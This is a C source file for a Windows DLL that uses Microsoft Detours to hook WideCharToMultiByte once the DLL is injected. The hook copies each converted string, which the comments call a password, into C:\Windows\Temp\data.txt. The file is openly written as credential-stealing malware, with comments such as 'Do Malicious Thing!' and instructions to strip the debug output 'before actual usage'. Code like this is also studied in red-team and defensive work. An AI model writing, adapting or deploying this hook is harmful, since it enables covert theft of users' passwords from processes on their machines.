#include <stdio.h>
#include <windows.h>
#include "detours.h"
#pragma comment(lib, "user32.lib")

// pointer to original WideCharToMultiByte
int (WINAPI * pWideCharToMultiByte)(
	UINT CodePage,
	DWORD dwFlags,
	_In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
	int cchWideChar,
	LPSTR lpMultiByteStr,
	int cbMultiByte,
	LPCCH lpDefaultChar,
	LPBOOL lpUsedDefaultChar
) = WideCharToMultiByte;

BOOL Hookem(void);
BOOL UnHookem(void);


// Hooking function
int HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags,_In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	
	// This will hold the output of WideCharToMultiByte
	int ret;
	// Buffer to hold the password
	char buffer[50];
	
	// Call Original Function	
	ret = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	
	// Do Malicious Thing!
	
	// Print Debug Strings to show in DebugView from Sysinternals Suite for Testing
	// Ensure to delete these two lines before actual usage!!!!
	sprintf(buffer, "DATA = %s\n", lpMultiByteStr);
	// OutputDebugStringA(buffer);
	
	// Store captured Password to disk
	HANDLE hFile = NULL;
	hFile = CreateFile("C:\\Windows\\Temp\\data.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	// Variable to track how many bytes written to the file
	DWORD numBytes;
	// Error Checking
	if (hFile == INVALID_HANDLE_VALUE)
		// OutputDebugStringA("Error with log file!\n");
		return ret;
	else
		// Write data to file
		WriteFile(hFile, buffer, strlen(buffer), &numBytes, NULL);
	
	// Close the handle to the file
	CloseHandle(hFile);
	
	
	return ret;
}

// Set hooks on WideCharToMultiByte
BOOL Hookem(void) {

    LONG err;

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	// Debug Messages for testing
	// printf("WideCharToMultiByte() hooked! (res = %d)\n", err);
	// OutputDebugStringA("WideCharToMultiByte() hooked!");
	
	
	return TRUE;
}

// Revert all changes to original code
BOOL UnHookem(void) {
	
	LONG err;
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	// Debug Messages for testing
	// printf("Hook removed from WideCharToMultiByte() with result = %d\n", err);
	// OutputDebugStringA("Hook removed from WideCharToMultiByte()");
	
	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			Hookem();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			UnHookem();
			break;
	}
	
    return TRUE;
}

